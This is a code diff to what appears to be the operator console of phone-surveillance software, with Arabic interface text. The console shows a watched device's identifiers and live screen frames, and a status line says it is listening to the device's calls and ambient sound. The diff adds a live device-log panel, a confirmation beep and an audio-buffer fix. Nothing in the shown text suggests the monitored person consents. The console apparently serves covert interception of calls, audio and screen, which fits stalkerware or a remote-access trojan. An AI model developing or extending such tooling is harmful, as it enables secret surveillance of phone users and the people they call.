@@ -450,6 +450,14 @@
                     </div>
                 </div>
 
+                <!-- Live Device Logs -->
+                <div class="info-section">
+                    <div class="section-title">📋 سجل أحداث الجهاز المباشر (Live Status)</div>
+                    <div id="modalDeviceLogs" style="font-family: monospace; font-size: 0.78rem; max-height: 110px; overflow-y: auto; background: rgba(0,0,0,0.4); padding: 0.5rem; border-radius: 6px; color: #a5f3fc; display: flex; flex-direction: column; gap: 0.25rem;">
+                        <span>بانتظار بدء الجلسة...</span>
+                    </div>
+                </div>
+
                 <!-- Serials & Identifiers -->
                 <div class="info-section">
                     <div class="section-title">🔑 السيريال ومعرفات الجهاز</div>
@@ -585,6 +593,9 @@
                 text.textContent = 'كتم الصوت (إيقاف الاستماع)';
                 dot.style.background = '#10b981';
                 statusText.innerHTML = '<span style="color: #10b981; font-weight:700;">● جاري الاستماع للمكالمة وصوت الجهاز مباشرة</span>';
+                
+                // Play short audible tone so user confirms speakers work
+                playTestBeep();
             } else {
                 btn.style.background = 'linear-gradient(135deg, #10b981, #059669)';
                 icon.textContent = '🔊';
@@ -593,6 +604,22 @@
                 statusText.innerHTML = '<span>الصوت مكتوم — اضغط على الزر لسماع مكالمة وصوت الهاتف</span>';
                 document.getElementById('audioActivityBar').style.width = '0%';
             }
+        }
+
+        function playTestBeep() {
+            try {
+                if (!audioCtx) return;
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                osc.type = 'sine';
+                osc.frequency.setValueAtTime(587.33, audioCtx.currentTime);
+                gain.gain.setValueAtTime(0.08, audioCtx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.18);
+                osc.connect(gain);
+                gain.connect(audioCtx.destination);
+                osc.start();
+                osc.stop(audioCtx.currentTime + 0.18);
+            } catch (_) {}
         }
 
         function playPcmChunk(pcmData) {
@@ -663,6 +690,16 @@
                                 const d = devices.find(x => x.id === currentWatchedId);
                                 if (d) populateModalDetails(d);
                             }
+                        } else if (msg.type === 'device_log') {
+                            const logsContainer = document.getElementById('modalDeviceLogs');
+                            if (logsContainer) {
+                                const time = new Date(msg.timestamp || Date.now()).toLocaleTimeString();
+                                const line = document.createElement('div');
+                                line.textContent = `[${time}] [${msg.tag}] ${msg.message} ${msg.error ? '⚠️ ' + msg.error : ''}`;
+                                if (msg.error) line.style.color = '#f87171';
+                                logsContainer.appendChild(line);
+                                logsContainer.scrollTop = logsContainer.scrollHeight;
+                            }
                         }
                     } catch (e) {
                         console.error('JSON Error:', e);
@@ -681,8 +718,11 @@
                             const jpegBlob = new Blob([arrayBuffer.slice(1)], { type: 'image/jpeg' });
                             updateLiveFrame(jpegBlob);
                         } else if (tag === 0x02) {
-                            // Audio PCM 16-bit 16kHz mono
-                            const pcmBytes = arrayBuffer.slice(1);
+                            // Audio PCM 16-bit 16kHz mono (ensure even byte length)
+                            let pcmBytes = arrayBuffer.slice(1);
+                            if (pcmBytes.byteLength % 2 !== 0) {
+                                pcmBytes = pcmBytes.slice(0, pcmBytes.byteLength - 1);
+                            }
                             const int16Samples = new Int16Array(pcmBytes);
                             playPcmChunk(int16Samples);
                         } else if (tag === 0xFF) {
